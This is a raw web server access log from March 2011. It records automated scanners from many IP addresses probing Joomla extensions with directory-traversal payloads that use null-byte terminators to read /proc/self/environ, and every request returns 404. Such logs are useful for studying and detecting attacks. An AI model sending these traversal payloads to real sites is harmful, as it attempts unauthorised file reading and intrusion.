202.229.134.2 - - [22/Mar/2011:05:04:31 +0900] "GET //index.php?option=com_sectionex&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
178.131.1.247 - - [22/Mar/2011:05:05:23 +0900] "GET //index.php?option=com_rpx&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
76.97.16.122 - - [22/Mar/2011:05:06:47 +0900] "GET //index.php?option=com_juliaportfolio&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
76.97.16.122 - - [22/Mar/2011:05:10:11 +0900] "GET //index.php?option=com_joomlapicasa2&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
178.131.1.247 - - [22/Mar/2011:05:14:04 +0900] "GET //index.php?option=com_ninjarsssyndicator&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
212.130.1.253 - - [22/Mar/2011:05:14:29 +0900] "GET /index.php?option=com_awiki&controller=../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
217.16.8.81 - - [22/Mar/2011:05:14:58 +0900] "GET //index.php?option=com_ninjarsssyndicator&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
217.16.8.81 - - [22/Mar/2011:05:15:11 +0900] "GET //index.php?option=com_ninjarsssyndicator&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
217.16.8.81 - - [22/Mar/2011:05:15:14 +0900] "GET //index.php?option=com_ninjarsssyndicator&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
217.16.8.81 - - [22/Mar/2011:05:15:18 +0900] "GET //index.php?option=com_ninjarsssyndicator&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
217.16.8.81 - - [22/Mar/2011:05:15:22 +0900] "GET //index.php?option=com_ninjarsssyndicator&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
217.16.8.81 - - [22/Mar/2011:05:15:22 +0900] "GET //index.php?option=com_ninjarsssyndicator&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
217.16.8.81 - - [22/Mar/2011:05:15:22 +0900] "GET //index.php?option=com_ninjarsssyndicator&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
217.16.8.81 - - [22/Mar/2011:05:15:25 +0900] "GET //index.php?option=com_ninjarsssyndicator&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
91.121.99.124 - - [22/Mar/2011:05:16:09 +0900] "GET /index.php?option=com_rpx&controller=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 215
76.97.16.122 - - [22/Mar/2011:05:16:19 +0900] "GET //index.php?option=com_juliaportfolio&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
94.23.48.205 - - [22/Mar/2011:05:16:22 +0900] "GET /index.php?option=com_awiki&controller=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 215
212.130.1.253 - - [22/Mar/2011:05:16:29 +0900] "GET /index.php?option=com_rpx&controller=../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
64.50.172.51 - - [22/Mar/2011:05:16:38 +0900] "GET /index.php?option=com_rpx&controller=../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
193.54.149.12 - - [22/Mar/2011:05:16:41 +0900] "GET /index.php?option=com_rpx&controller=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 215
69.64.77.118 - - [22/Mar/2011:05:16:56 +0900] "GET /index.php?option=com_rpx&controller=../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
91.121.99.124 - - [22/Mar/2011:05:17:30 +0900] "GET /index.php?option=com_rpx&controller=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 215
64.50.172.51 - - [22/Mar/2011:05:17:36 +0900] "GET /index.php?option=com_awiki&controller=../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
212.130.1.253 - - [22/Mar/2011:05:17:51 +0900] "GET /index.php?option=com_awiki&controller=../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
193.54.149.12 - - [22/Mar/2011:05:17:56 +0900] "GET /index.php?option=com_rpx&controller=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 215
69.64.77.118 - - [22/Mar/2011:05:18:11 +0900] "GET /index.php?option=com_awiki&controller=../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
94.23.48.205 - - [22/Mar/2011:05:18:31 +0900] "GET //index.php?option=com_aardvertiser&task=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 216
64.50.172.51 - - [22/Mar/2011:05:18:36 +0900] "GET //index.php?option=com_aardvertiser&task=../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
94.23.48.205 - - [22/Mar/2011:05:18:45 +0900] "GET /index.php?option=com_rpx&controller=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 215
69.64.77.118 - - [22/Mar/2011:05:18:53 +0900] "GET //index.php?option=com_aardvertiser&task=../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
212.130.1.253 - - [22/Mar/2011:05:18:55 +0900] "GET //index.php?option=com_aardvertiser&task=../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
212.130.1.253 - - [22/Mar/2011:05:19:13 +0900] "GET /index.php?option=com_rpx&controller=../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
64.50.172.51 - - [22/Mar/2011:05:19:24 +0900] "GET /index.php?option=com_rpx&controller=../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
76.97.16.122 - - [22/Mar/2011:05:19:34 +0900] "GET //index.php?option=com_jvehicles&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
212.130.1.253 - - [22/Mar/2011:05:19:36 +0900] "GET //index.php?option=com_aardvertiser&task=../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
195.238.236.131 - - [22/Mar/2011:05:19:44 +0900] "GET //index.php?option=com_jresearch&controller=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 216
91.121.99.124 - - [22/Mar/2011:05:19:51 +0900] "GET //index.php?option=com_aardvertiser&task=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 216
69.64.77.118 - - [22/Mar/2011:05:19:56 +0900] "GET /index.php?option=com_rpx&controller=../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
195.238.236.131 - - [22/Mar/2011:05:20:30 +0900] "GET //index.php?option=com_jresearch&controller=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 216
94.23.48.205 - - [22/Mar/2011:05:20:37 +0900] "GET //index.php?option=com_rpx&controller=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 216
193.54.149.12 - - [22/Mar/2011:05:20:51 +0900] "GET //index.php?option=com_aardvertiser&task=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 216
195.238.236.131 - - [22/Mar/2011:05:20:54 +0900] "GET //index.php?option=com_jresearch&controller=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 216
195.238.236.131 - - [22/Mar/2011:05:20:55 +0900] "GET //index.php?option=com_jresearch&controller=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 216
76.97.16.122 - - [22/Mar/2011:05:20:58 +0900] "GET //index.php?option=com_joomlapicasa2&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
64.50.172.51 - - [22/Mar/2011:05:21:11 +0900] "GET //index.php?option=com_rpx&controller=../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
212.130.1.253 - - [22/Mar/2011:05:21:11 +0900] "GET //index.php?option=com_rpx&controller=../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
69.64.77.118 - - [22/Mar/2011:05:21:12 +0900] "GET //index.php?option=com_rpx&controller=../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
91.121.99.124 - - [22/Mar/2011:05:21:24 +0900] "GET /index.php?option=com_ganalytics&controller=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 215
94.23.48.205 - - [22/Mar/2011:05:21:49 +0900] "GET /index.php?option=com_ganalytics&controller=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 215
178.131.1.247 - - [22/Mar/2011:05:23:12 +0900] "GET //index.php?option=com_ninjarsssyndicator&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
202.229.134.2 - - [22/Mar/2011:05:24:37 +0900] "GET //index.php?option=com_gcalendar&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
212.130.1.253 - - [22/Mar/2011:05:25:20 +0900] "GET /index.php?option=com_ganalytics&controller=../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
64.50.172.51 - - [22/Mar/2011:05:25:31 +0900] "GET /index.php?option=com_ganalytics&controller=../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
69.64.77.118 - - [22/Mar/2011:05:27:03 +0900] "GET /index.php?option=com_ganalytics&controller=../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
91.191.171.38 - - [22/Mar/2011:05:27:35 +0900] "GET /access_log.last//index.php?option=com_market&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 232
91.191.171.38 - - [22/Mar/2011:05:27:36 +0900] "GET //index.php?option=com_market&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
91.191.171.38 - - [22/Mar/2011:05:28:07 +0900] "GET /access_log.last//index.php?option=com_market&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 232
91.191.171.38 - - [22/Mar/2011:05:28:07 +0900] "GET //index.php?option=com_market&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
76.97.16.122 - - [22/Mar/2011:05:30:00 +0900] "GET //index.php?option=com_joomlapicasa2&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
91.121.99.124 - - [22/Mar/2011:05:31:57 +0900] "GET //index.php?option=com_jresearch&controller=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 216
94.23.48.205 - - [22/Mar/2011:05:32:16 +0900] "GET //index.php?option=com_jresearch&controller=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 216
94.23.48.205 - - [22/Mar/2011:05:32:18 +0900] "GET /index.php?option=com_sectionex&controller=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 215
216.246.46.88 - - [22/Mar/2011:05:32:39 +0900] "GET //*.php?option=com_hsconfig&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 212
216.246.46.88 - - [22/Mar/2011:05:33:43 +0900] "GET //*.php?option=com_hsconfig&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 212
91.191.171.38 - - [22/Mar/2011:05:33:50 +0900] "GET //index.php?option=com_myblog&Itemid=12&task=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
94.23.48.205 - - [22/Mar/2011:05:34:00 +0900] "GET //index.php?option=com_jresearch&controller=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 216
212.130.1.253 - - [22/Mar/2011:05:34:21 +0900] "GET //index.php?option=com_jeformcr&view=../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
64.50.172.51 - - [22/Mar/2011:05:34:24 +0900] "GET //index.php?option=com_jresearch&controller=../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
212.130.1.253 - - [22/Mar/2011:05:34:40 +0900] "GET //index.php?option=com_jresearch&controller=../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
212.130.1.253 - - [22/Mar/2011:05:34:51 +0900] "GET //index.php?option=com_jresearch&controller=../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
69.64.77.118 - - [22/Mar/2011:05:35:03 +0900] "GET //index.php?option=com_jeformcr&view=../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
69.64.77.118 - - [22/Mar/2011:05:35:14 +0900] "GET //index.php?option=com_jresearch&controller=../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
69.64.77.118 - - [22/Mar/2011:05:37:08 +0900] "GET /index.php?option=com_sectionex&controller=../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
94.23.48.205 - - [22/Mar/2011:05:37:12 +0900] "GET //index.php?option=com_gcalendar&controller=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 216
77.221.130.40 - - [22/Mar/2011:05:37:59 +0900] "GET /access_log.last//index.php?option=com_bca-rss-syndicator&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 232
77.221.130.40 - - [22/Mar/2011:05:38:01 +0900] "GET //index.php?option=com_bca-rss-syndicator&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
94.23.48.205 - - [22/Mar/2011:05:38:04 +0900] "GET //index.php?option=com_smestorage&controller=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 216
91.121.99.124 - - [22/Mar/2011:05:38:08 +0900] "GET //index.php?option=com_smestorage&controller=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 216
77.221.130.40 - - [22/Mar/2011:05:38:47 +0900] "GET /access_log.last//index.php?option=com_bca-rss-syndicator&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 232
77.221.130.40 - - [22/Mar/2011:05:38:47 +0900] "GET //index.php?option=com_bca-rss-syndicator&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
69.64.77.118 - - [22/Mar/2011:05:39:10 +0900] "GET //index.php?option=com_smestorage&controller=../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
212.130.1.253 - - [22/Mar/2011:05:39:20 +0900] "GET //index.php?option=com_gcalendar&controller=../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
77.221.130.40 - - [22/Mar/2011:05:39:23 +0900] "GET /access_log.last//index.php?option=com_bca-rss-syndicator&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 232
64.50.172.51 - - [22/Mar/2011:05:39:24 +0900] "GET //index.php?option=com_smestorage&controller=../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
77.221.130.40 - - [22/Mar/2011:05:39:24 +0900] "GET //index.php?option=com_bca-rss-syndicator&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
94.23.48.205 - - [22/Mar/2011:05:40:05 +0900] "GET //index.php?option=com_smestorage&controller=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 216
76.97.16.122 - - [22/Mar/2011:05:40:06 +0900] "GET //index.php?option=com_joomlapicasa2&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
64.50.172.51 - - [22/Mar/2011:05:40:07 +0900] "GET //index.php?option=com_gcalendar&controller=../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
69.64.77.118 - - [22/Mar/2011:05:40:21 +0900] "GET //index.php?option=com_smestorage&controller=../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
77.221.130.40 - - [22/Mar/2011:05:40:22 +0900] "GET /access_log.last//index.php?option=com_bca-rss-syndicator&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 232
77.221.130.40 - - [22/Mar/2011:05:40:22 +0900] "GET //index.php?option=com_bca-rss-syndicator&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
212.130.1.253 - - [22/Mar/2011:05:40:24 +0900] "GET //index.php?option=com_smestorage&controller=../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
64.50.172.51 - - [22/Mar/2011:05:40:34 +0900] "GET //index.php?option=com_smestorage&controller=../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
212.130.1.253 - - [22/Mar/2011:05:40:47 +0900] "GET //index.php?option=com_smestorage&controller=../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
216.246.46.88 - - [22/Mar/2011:05:41:38 +0900] "GET //*.php?option=com_hsconfig&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 212
94.23.48.205 - - [22/Mar/2011:05:41:51 +0900] "GET //index.php?option=com_ckforms&controller=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 216
69.64.77.118 - - [22/Mar/2011:05:42:18 +0900] "GET //index.php?option=com_gcalendar&controller=../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
76.97.16.122 - - [22/Mar/2011:05:42:49 +0900] "GET //index.php?option=com_joomlapicasa2&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
178.131.1.247 - - [22/Mar/2011:05:44:43 +0900] "GET //index.php?option=com_jeformcr&view=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
76.97.16.122 - - [22/Mar/2011:05:44:46 +0900] "GET //index.php?option=com_joomlapicasa2&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
217.16.8.81 - - [22/Mar/2011:05:45:10 +0900] "GET //index.php?option=com_jeformcr&view=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
217.16.8.81 - - [22/Mar/2011:05:45:10 +0900] "GET //index.php?option=com_jeformcr&view=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
